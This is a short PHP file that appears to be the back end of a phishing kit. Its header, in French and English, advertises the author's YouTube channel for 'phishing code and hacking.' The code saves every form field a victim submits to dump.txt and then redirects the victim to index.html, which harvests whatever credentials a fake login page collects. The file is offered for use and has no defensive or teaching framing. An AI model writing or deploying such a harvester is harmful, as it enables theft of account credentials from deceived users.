<?php
/*                                                                                                         
####################################################################
# s'abonner sur ma chaine youtube pour avoir plus de code phishing #
# et hacking,il me donne le courage de faire les codes phishing    #                                                                              
#                                                                  #
# subscribe on my youtube channel to have more phishing code       #
# and hacking, it gives me the courage to do the phishing codes    #
#                                                                  #
#             ||~~ BY ~~ hakanonymos ~~||                          #
#                                                                  #
#  https://www.youtube.com/channel/UCQsDsjPcX3UoQuJPz7BBxxg        #
#                                                                  #
#    skype et email : hakanonymos@hotmail.com                      #                                                                 
####################################################################                                                                                                    
*/  

 $fichier = fopen('dump.txt', 'r+' );
 file_put_contents('dump.txt' , print_r($_POST, true));
 fclose($fichier);

 
 header('location: index.html');
                                                       
 
 
 ?>
                                    